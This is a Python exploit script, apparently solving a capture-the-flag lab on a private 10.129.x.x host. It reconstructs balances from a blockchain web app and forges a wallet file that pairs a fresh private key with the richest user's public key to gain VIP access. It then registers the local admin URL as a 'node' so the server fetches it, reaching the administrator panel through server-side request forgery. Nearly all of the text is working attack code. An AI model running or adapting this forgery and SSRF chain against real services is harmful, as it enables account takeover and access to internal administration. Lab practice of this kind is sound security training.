#!/usr/bin/env python3
import html
import json
import re
from collections import defaultdict

import requests

BASE = "http://10.129.40.23:8080"
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0"

# Create a legitimate local private key.
response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "create", "filename": "fresh"},
    timeout=20,
)
response.raise_for_status()
fresh_wallet = response.json()

# Reconstruct balances from the public chain.
chain = session.get(f"{BASE}/blockchain", timeout=20).json()
balances = defaultdict(int)

for block in chain:
    for transaction in block.get("data", []):
        if not isinstance(transaction, dict) or "amount" not in transaction:
            continue

        amount = int(transaction["amount"])
        sender = transaction.get("sender")
        receiver = transaction.get("receiver")

        if receiver:
            balances[receiver] += amount
        if sender and sender != "Blockchain_Reward":
            balances[sender] -= amount

vip_public_key, vip_balance = max(balances.items(), key=lambda item: item[1])
assert vip_balance >= 10, "No VIP-capable historical wallet found"

forged_wallet = {
    "private_key": fresh_wallet["private_key"],
    "public_key": vip_public_key,
}

response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "load"},
    files={
        "file": (
            "forged_wallet.json",
            json.dumps(forged_wallet),
            "application/json",
        )
    },
    timeout=20,
)
response.raise_for_status()
assert "Wallet loaded successfully" in response.text

print(f"VIP wallet loaded (balance={vip_balance})")

def register_node(url):
    response = session.post(
        f"{BASE}/dashboard/vip/nodes",
        data={"action": "register", "node": url},
        timeout=20,
    )
    response.raise_for_status()

def find_node_id(url):
    page = session.get(
        f"{BASE}/dashboard/vip/nodes",
        timeout=20,
    ).text

    print("\n--- NODE PAGE ---")
    print(page)
    print("--- END NODE PAGE ---\n")

    pairs = [
        (html.unescape(value), node_id)
        for value, node_id in re.findall(
            r'title="([^"]+)".*?testNode\(\'([0-9]+)\'\)',
            page,
            re.S,
        )
    ]

    print("Extracted pairs:")
    for pair in pairs:
        print(repr(pair))

    for value, node_id in reversed(pairs):
        if value.strip() == url.strip():
            return node_id

    raise RuntimeError(
        f"Could not find registered node {url!r}. "
        f"Available nodes: {[value for value, _ in pairs]!r}"
    )


def test_node(url):
    node_id = find_node_id(url)
    response = session.get(
        f"{BASE}/dashboard/vip/nodes/test_node/{node_id}",
        timeout=60,
    )
    response.raise_for_status()
    return response.text


admin_url = "http://0.0.0.0:8080/admin"
register_node(admin_url)
assert "Admin Dashboard" in test_node(admin_url)
print("Local administrator panel reached through SSRF")